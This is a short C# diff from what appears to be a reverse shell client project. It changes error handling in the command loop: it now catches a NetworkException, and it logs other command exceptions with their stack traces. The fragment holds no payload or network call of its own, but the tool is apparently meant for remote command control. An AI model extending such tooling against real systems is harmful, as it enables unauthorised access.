@@ -208,11 +208,17 @@ namespace ReverseShellClient
                             Cleanup(isCommandProcessing: false);
                             break;
                         }
-                        catch (IOException)
+                        catch (NetworkException)
                         {
-                            // Most likely the server disconnected, or a command didn't catch its exception...
                             Cleanup(isCommandProcessing: true);
                             break;
+                        }
+                        catch (Exception ex)
+                        {
+                            // Some command didn't catch its exception...
+                            ColorTools.WriteCommandError("An exception occured, this command might be broken...\nDetails below :");
+                            Console.WriteLine(ex.Message);
+                            Console.WriteLine(ex.StackTrace);
                         }
                     }
                     else
